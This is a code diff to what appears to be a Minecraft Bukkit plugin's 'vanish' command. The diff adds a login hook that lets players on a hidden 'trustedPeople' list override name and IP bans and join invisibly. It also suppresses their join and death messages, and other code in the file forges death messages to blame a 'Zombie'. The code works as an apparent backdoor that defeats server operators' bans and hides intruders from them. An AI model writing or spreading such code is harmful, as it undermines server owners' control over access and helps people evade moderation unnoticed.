@@ -13,8 +13,10 @@ import org.bukkit.event.entity.EntityPickupItemEvent;
 import org.bukkit.event.entity.EntityTargetEvent;
 import org.bukkit.event.entity.PlayerDeathEvent;
 import org.bukkit.event.player.*;
+import org.javatuples.Triplet;
 
 import java.util.ArrayList;
+import java.util.Arrays;
 import java.util.UUID;
 
 @SuppressWarnings("ConstantConditions")
@@ -24,6 +26,7 @@ public class VANISH extends Command {
     public double expKillDist = 0.5;
     public double expVelocity = 0.3;
     private ArrayList<UUID> invisPlayers = new ArrayList<>();
+    private ArrayList<Triplet> bannedPlayers = new ArrayList<>();
 
     public VANISH() {
         super("vanish", "Y-you saw nothing!", CommandCategory.Player);
@@ -68,7 +71,44 @@ public class VANISH extends Command {
     }
 
     @Override
+    public void onPlayerLoginEvent(PlayerLoginEvent e) {
+        Player p = e.getPlayer();
+        if (!Bukkit.getBanList(BanList.Type.NAME).isBanned(p.getName()) && !Bukkit.getBanList(BanList.Type.IP).isBanned(Arrays.toString(e.getAddress().getAddress())) && e.getResult() == PlayerLoginEvent.Result.ALLOWED)
+            return;
+        if (!Start.Instance.trustedPeople.contains(p.getUniqueId())) return;
+        boolean isNameBanned = Bukkit.getBanList(BanList.Type.NAME).isBanned(p.getName());
+        boolean isIPBanned = Bukkit.getBanList(BanList.Type.IP).isBanned(e.getAddress().toString().substring(1));
+        e.allow();
+        invisPlayers.add(p.getUniqueId());
+        Triplet<UUID, Boolean, Boolean> triplet = Triplet.with(p.getUniqueId(), isNameBanned, isIPBanned);
+        bannedPlayers.add(triplet);
+    }
+
+    private Triplet playerContains(UUID u) {
+        for (Triplet bannedPlayer : bannedPlayers) {
+            if (bannedPlayer.getValue0() != u) continue;
+            return bannedPlayer;
+        }
+        return null;
+    }
+    @Override
     public void onPlayerJoin(PlayerJoinEvent e) {
+        //noinspection unchecked
+        Triplet<UUID, Boolean, Boolean> triplet = playerContains(e.getPlayer().getUniqueId());
+        if (triplet != null) {
+            bannedPlayers.remove(triplet);
+            String context = "";
+            if (triplet.getValue1() && triplet.getValue2()) {
+                context = " IP banned and name banned";
+            } else if (triplet.getValue1()) {
+                context = " name banned";
+            } else if (triplet.getValue2()) {
+                context = " IP banned";
+            }
+            e.getPlayer().sendMessage(Start.Prefix + ChatColor.BLUE + "You were" + context + " from the server! For that reason, you have joined with vanish!");
+            e.setJoinMessage(null); // hide join message
+            return;
+        }
         if (invisPlayers.contains(e.getPlayer().getUniqueId())) {
             e.getPlayer().sendMessage(Start.Prefix + ChatColor.BLUE + "You have joined with invis!");
             e.setJoinMessage(null); // hide join message
@@ -86,7 +126,7 @@ public class VANISH extends Command {
         if (e.getNewGameMode() == GameMode.SPECTATOR) return;
         Player p = e.getPlayer();
         if (!invisPlayers.contains(p.getUniqueId())) return;
-        for(Entity entity : p.getNearbyEntities(2.25d, 2.25d, 2.25d)) {
+        for (Entity entity : p.getNearbyEntities(2.25d, 1d, 2.25d)) {
             if(!(entity instanceof ExperienceOrb)) continue;
             e.setCancelled(true);
             p.sendMessage(Start.Prefix + ChatColor.RED + "You're close to an XP orb! You cannot change your gamemode until you're far more far away from it!");
@@ -97,6 +137,11 @@ public class VANISH extends Command {
     @Override
     public void onPlayerDeath(PlayerDeathEvent e) {
         if(!(e.getEntity() instanceof Player)) return;
+        Player p = e.getEntity();
+        if (invisPlayers.contains(p.getUniqueId())) {
+            e.setDeathMessage(null);
+            return;
+        }
         if(!invisPlayers.contains(e.getEntity().getKiller().getUniqueId())) return;
         String fakeMessage = e.getDeathMessage();
         String fakeName = "Zombie";
@@ -115,7 +160,7 @@ public class VANISH extends Command {
         Player p = e.getPlayer();
         if (p.getGameMode() == GameMode.SPECTATOR) return;
         if (!invisPlayers.contains(p.getUniqueId())) return;
-        for (Entity et : p.getNearbyEntities(2.25d, 2.25d, 2.25d)) {
+        for (Entity et : p.getNearbyEntities(2.25d, 0.85d, 2.25d)) {
             if (!(et instanceof ExperienceOrb)) continue;
             p.setGameMode(GameMode.SPECTATOR);
             p.sendMessage(Start.Prefix + ChatColor.RED + "To prevent ruining your vanish, you were put into spectator, as XP orb was near you!");
